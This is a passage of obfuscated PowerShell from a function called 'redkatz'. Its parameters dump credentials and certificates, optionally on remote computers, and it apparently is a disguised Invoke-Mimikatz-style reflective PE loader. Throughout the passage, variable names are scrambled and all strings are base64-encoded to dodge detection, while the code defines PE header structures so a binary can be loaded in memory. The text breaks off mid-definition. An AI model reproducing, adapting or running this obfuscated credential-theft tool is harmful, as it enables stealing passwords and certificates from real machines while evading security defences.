function redkatz
{
[CmdletBinding(DefaultParameterSetName="DCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,
    [Parameter(ParameterSetName = "DCreds", Position = 1)]
    [Switch]
    $DumpCreds,
    [Parameter(ParameterSetName = "DCerts", Position = 1)]
    [Switch]
    $DumpCerts,
    [Parameter(ParameterSetName = "CustCom", Position = 1)]
    [String]
    $CustomCommand
)
Set-StrictMode -Version 2
${_/\_/\/=\_/=\_/\_} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		${_/=\/\_/\/\/\/\/=},
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        ${____/====\/====\_/}
	)
	Function _/=\/\/=\_/=\_/\__
	{
		$Win32Types = New-Object System.Object
		${_/\/\__/\/\/=\/\_} = [AppDomain]::CurrentDomain
		${___/=\_/=====\_/\} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${___/=\___/\_/\_/\} = ${_/\/\__/\/\/=\/\_}.DefineDynamicAssembly(${___/=\_/=====\_/\}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${__/=\/==\___/\_/\} = ${___/=\___/\_/\_/\}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${/=\__/\/==\_/==\/} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${/==\/\__/=\/\/\/\} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${/==\/\__/=\/\/\/\}
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${__/=\__/==\/\/\/\} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${__/=\__/==\/\/\/\}
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${_/\_/\/==\_/=\/\/} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${_/\_/\/==\_/=\/\/}
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${____/\/\_/\__/===}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${_/\___/\___/===\/} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${_/\___/\___/===\/}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 8)
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${/=\/\/\/==\_/====} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${/=\/\/\/==\_/====}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 20)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${___/=\/\/\___/==\} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${___/=\/\/\___/==\}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 240)
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${__/=\__/==\/\/\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${_/\_/\/==\_/=\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${_/\___/\___/===\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
